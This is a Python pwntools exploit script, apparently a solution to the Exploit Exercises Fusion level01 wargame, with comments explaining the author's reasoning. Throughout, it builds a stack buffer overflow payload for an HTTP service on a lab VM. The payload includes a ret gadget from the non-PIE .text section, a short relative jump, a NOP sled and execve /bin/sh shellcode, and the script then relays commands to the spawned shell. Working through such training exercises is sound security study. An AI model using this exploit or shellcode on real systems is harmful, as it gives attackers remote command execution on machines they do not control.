#After attempting to just brute force the buffer address since the sample space is not that large
#I decided there has to be a better way to do this, so I ended up using this write-up as an outline: 
#https://www.silentgrid.com/blog/exploit-exercises-fusion-level01/
#To make sure I understood it I gave my interpretation of why the author did what he did.
from pwn import *

#$ ip a
addr = "192.168.56.103"
#$ sudo netstat -lptu | grep level00
port = 20001

r = remote(addr, port)

#Found at http://shell-storm.org/shellcode/files/shellcode-811.php
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

#Although ASLR is enabled, PIE is not, therefore we can use the .text section.
#After some investigation, ESP points to an address in the resolved buffer and 
#the original buffer and shellcode lay just beyond that. If we place a jump in
#the resolved buffer, it should end up at our shellcode. We just need to find a
#ret in the .text section which is easy enough.
#$ objdump -d level01 | grep ret
ret_addr = p32(0x80488b9)

#Using an online assembler to get opcodes for jmp 72 (which should land somewhere in the nop sled)
#This needs to be 12 bytes before the end of the A's 
#I learned there were different types of jmps today. This EB one here will jump a relative amount.
#Here's where I learned about short jumps: https://thestarman.pcministry.com/asm/2bytejumps.htm
#The nops afterwards are necesarry to prevent the CPU thinking that the A's that follow are
#part of the instruction. When I tried that it was waaay off. 
jump = b"\xEB\x48\x90\x90"

#I derived this part in the level00.
r.send(b"GET " + b"A" * 127 + jump + b"A" * 8 + ret_addr + b" HTTP/1.1" + b"\x90" * 200 + shellcode)
#I would have preferred to use interactive(), but it ends each line with \r and bash did not like that
while True:
        r.send(input() + "\n")
        print(r.recv())
